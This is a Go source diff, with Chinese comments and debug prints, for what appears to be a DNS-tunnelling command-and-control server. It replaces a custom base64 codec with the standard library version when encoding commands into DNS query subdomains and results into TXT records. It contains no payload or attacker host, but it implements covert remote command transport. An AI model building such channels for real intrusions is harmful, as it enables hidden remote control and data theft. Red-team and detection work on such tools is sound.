@@ -29,6 +29,7 @@ package server
 import (
 	"bufio"
 	"crypto/rand"
+	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"net"
@@ -386,8 +387,10 @@ func (c *Controller) createDNSQuery(command string) []byte {
 	dnsPacket := encodeDNSHeader(header)
 
 	// 创建查询域名，将命令编码到域名中
-	// 使用base64编码命令以避免域名特殊字符问题
-	commandEncoded := encodeBase64(command)
+	// 使用标准库Base64编码命令以避免域名特殊字符问题，确保UTF-8中文正确处理
+	commandEncoded := base64.URLEncoding.EncodeToString([]byte(command))
+	fmt.Printf("[服务器调试] Base64编码命令 - 输入UTF-8字节: %d，输出长度: %d，命令: %s\n",
+		len([]byte(command)), len(commandEncoded), command)
 	queryDomain := fmt.Sprintf("%s.%s%s", commandEncoded, COMMAND_SUBDOMAIN, DNS_DOMAIN_SUFFIX)
 
 	// 编码查询域名
@@ -443,7 +446,9 @@ func (c *Controller) createDNSResponse(queryID uint16, responseData string) []by
 	dnsPacket = append(dnsPacket, ttl...)
 
 	// TXT记录数据
-	encodedResponse := encodeBase64(responseData)
+	encodedResponse := base64.URLEncoding.EncodeToString([]byte(responseData))
+	fmt.Printf("[服务器调试] Base64编码响应 - 输入UTF-8字节: %d，输出长度: %d\n",
+		len([]byte(responseData)), len(encodedResponse))
 	if len(encodedResponse) > 255 {
 		encodedResponse = encodedResponse[:255] // TXT记录最大255字符
 	}
@@ -490,91 +495,16 @@ func (c *Controller) parseDNSQuery(data []byte) (string, uint16, error) {
 	}
 
 	encodedCommand := parts[0]
-	command, err := decodeBase64(encodedCommand)
+	// 使用标准库Base64解码，确保UTF-8中文字符正确处理
+	decodedBytes, err := base64.URLEncoding.DecodeString(encodedCommand)
 	if err != nil {
 		return "", header.ID, fmt.Errorf("解码命令失败: %w", err)
 	}
+	command := string(decodedBytes)
+	fmt.Printf("[服务器调试] Base64解码命令 - 输入长度: %d，输出UTF-8字节: %d，命令: %s\n",
+		len(encodedCommand), len(decodedBytes), command)
 
 	return command, header.ID, nil
-}
-
-// encodeBase64 简单的base64编码实现（用于DNS域名安全）
-func encodeBase64(data string) string {
-	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
-	input := []byte(data)
-	var result strings.Builder
-
-	for i := 0; i < len(input); i += 3 {
-		var a, b, c byte
-		a = input[i]
-		if i+1 < len(input) {
-			b = input[i+1]
-		}
-		if i+2 < len(input) {
-			c = input[i+2]
-		}
-
-		result.WriteByte(chars[a>>2])
-		result.WriteByte(chars[((a&0x03)<<4)|((b&0xf0)>>4)])
-
-		if i+1 < len(input) {
-			result.WriteByte(chars[((b&0x0f)<<2)|((c&0xc0)>>6)])
-		}
-		if i+2 < len(input) {
-			result.WriteByte(chars[c&0x3f])
-		}
-	}
-
-	return result.String()
-}
-
-// decodeBase64 简单的base64解码实现
-func decodeBase64(encoded string) (string, error) {
-	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
-
-	// 创建解码表
-	decodeTable := make(map[byte]byte)
-	for i, c := range chars {
-		decodeTable[byte(c)] = byte(i)
-	}
-
-	input := []byte(encoded)
-	var result []byte
-
-	for i := 0; i < len(input); i += 4 {
-		var a, b, c, d byte = 0, 0, 0, 0
-
-		if i < len(input) {
-			if val, ok := decodeTable[input[i]]; ok {
-				a = val
-			}
-		}
-		if i+1 < len(input) {
-			if val, ok := decodeTable[input[i+1]]; ok {
-				b = val
-			}
-		}
-		if i+2 < len(input) {
-			if val, ok := decodeTable[input[i+2]]; ok {
-				c = val
-			}
-		}
-		if i+3 < len(input) {
-			if val, ok := decodeTable[input[i+3]]; ok {
-				d = val
-			}
-		}
-
-		result = append(result, (a<<2)|((b&0x30)>>4))
-		if i+2 < len(input) {
-			result = append(result, ((b&0x0f)<<4)|((c&0x3c)>>2))
-		}
-		if i+3 < len(input) {
-			result = append(result, ((c&0x03)<<6)|d)
-		}
-	}
-
-	return string(result), nil
 }
 
 // ==============================================
@@ -752,12 +682,13 @@ func (c *Controller) parseDNSResponse(data []byte) (string, error) {
 
 	fmt.Printf("[调试] 总编码数据长度: %d\n", encodedData.Len())
 
-	// 解码base64数据
-	result, err := decodeBase64(encodedData.String())
+	// 使用标准库Base64解码，确保UTF-8中文字符正确处理
+	decodedBytes, err := base64.URLEncoding.DecodeString(encodedData.String())
 	if err != nil {
 		return "", fmt.Errorf("解码响应数据失败: %w", err)
 	}
-
-	fmt.Printf("[调试] 解码后结果长度: %d 字符\n", len(result))
+	result := string(decodedBytes)
+	fmt.Printf("[调试] Base64解码响应 - 输入长度: %d，输出UTF-8字节: %d，结果长度: %d 字符\n",
+		encodedData.Len(), len(decodedBytes), len(result))
 	return result, nil
 }
